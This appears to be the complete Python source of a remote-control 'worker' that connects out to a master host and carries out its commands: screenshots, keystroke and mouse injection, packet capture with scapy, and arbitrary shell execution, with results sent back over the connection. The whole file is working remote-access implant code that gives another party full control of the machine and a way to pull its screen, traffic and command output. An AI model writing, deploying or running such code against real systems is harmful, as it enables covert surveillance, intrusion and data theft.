import socket
import subprocess
import pyautogui
import io
import os
from scapy.all import sniff, wrpcap
from client_http import Client
from request import Request
from response import Response
import sys

MASTER_HOST = sys.argv[1]
MASTER_PORT = int(sys.argv[2])

worker = Client()
worker.open((MASTER_HOST, MASTER_PORT))
print("[+] Connected to master.")

def recv_all(sock):
    raw = b""
    while True:
        raw += sock.recv(4096)
        if b"\r\n\r\n" in raw:
            header_part, _, body_part = raw.partition(b"\r\n\r\n")
            content_length = None
            for line in header_part.split(b"\r\n")[1:]:
                if line.lower().startswith(b"content-length:"):
                    content_length = int(line.split(b":", 1)[1].strip())
                    break
            if content_length is None or len(body_part) >= content_length:
                break
    return raw

def make_response(status, message, body):
    if isinstance(body, str):
        body = body.encode()
    return Response(
        status=status,
        message=message,
        headers={"Content-Length": [str(len(body))]},
        body=body,
    )

while True:
    raw = recv_all(worker.connection)
    cmd = Request.load(raw).body.decode(errors="replace").strip()

    if cmd == "exit":
        break

    elif cmd.startswith("screenshot"):
        parts = cmd.split()
        path = parts[1]
        destination = parts[2]

        screenshot = pyautogui.screenshot()

        if destination == "worker":
            screenshot.save(path)
            response = make_response(200, "OK", "screenshot process complete")
        else:
            buffer = io.BytesIO()
            screenshot.save(buffer, format="PNG")
            image_bytes = buffer.getvalue()
            response = make_response(200, "OK", image_bytes)

        worker.connection.sendall(response.dump())

    elif cmd.startswith("keypress"):
        parts = cmd.split()
        mode = parts[1]
        keys = parts[2:]

        if mode == "combo":
            pyautogui.hotkey(*keys)
            response = make_response(200, "OK", "combo keypress process complete")
        else:
            for key in keys:
                pyautogui.press(key)
            response = make_response(200, "OK", "sequence keypress process complete")

        worker.connection.sendall(response.dump())

    elif cmd.startswith("mouse"):
        actions = cmd[6:].split(",")
        for action in actions:
            parts = action.strip().split()
            if parts[0] == "move":
                pyautogui.moveTo(int(parts[1]), int(parts[2]))
            elif parts[0] == "click":
                pyautogui.click(int(parts[1]), int(parts[2]), button=parts[3])
            elif parts[0] == "doubleclick":
                pyautogui.doubleClick(int(parts[1]), int(parts[2]), button=parts[3])
        response = make_response(200, "OK", f"{pyautogui.position()}")
        worker.connection.sendall(response.dump())

    elif cmd.startswith("sniff"):
        import shlex
        parts = shlex.split(cmd)
        filter_str = parts[1]
        duration = int(parts[2])
        count = int(parts[3])
        path = parts[4]
        destination = parts[5]

        packets = sniff(filter=filter_str, timeout=duration, count=count)

        if destination == "worker":
            wrpcap(path, packets)
            response = make_response(200, "OK", "sniff process complete")
        else:
            wrpcap("temp.pcap", packets)
            with open("temp.pcap", "rb") as f:
                pcap_bytes = f.read()
            os.remove("temp.pcap")
            response = make_response(200, "OK", pcap_bytes)

        worker.connection.sendall(response.dump())

    else:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = (result.stdout + result.stderr).encode()
        response = make_response(
            200 if result.returncode == 0 else 500,
            "OK" if result.returncode == 0 else "Error",
            output,
        )
        worker.connection.sendall(response.dump())

worker.connection.close()